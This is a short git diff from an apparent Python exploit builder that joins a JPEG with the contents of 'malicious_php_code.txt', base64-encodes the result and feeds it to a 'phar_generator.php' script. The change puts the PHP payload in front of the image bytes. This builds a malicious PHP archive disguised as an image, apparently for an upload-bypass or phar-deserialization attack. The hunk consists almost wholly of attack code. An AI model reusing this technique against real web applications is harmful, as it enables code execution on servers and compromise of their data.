@@ -24,8 +24,8 @@ with open('starbucks3.jpeg', 'rb') as f:
 
 malicious_payload_data = Path('malicious_php_code.txt').read_text().encode()
 
-phar_payload = base64.b64encode(picture_data + malicious_payload_data).decode()
-
+#phar_payload = base64.b64encode(picture_data + malicious_payload_data).decode()
+phar_payload = base64.b64encode(malicious_payload_data+picture_data).decode()
 bash_command = "php phar_generator.php " + phar_payload
 process = subprocess.Popen(bash_command.split(), stdout=subprocess.PIPE)
 output, error = process.communicate()
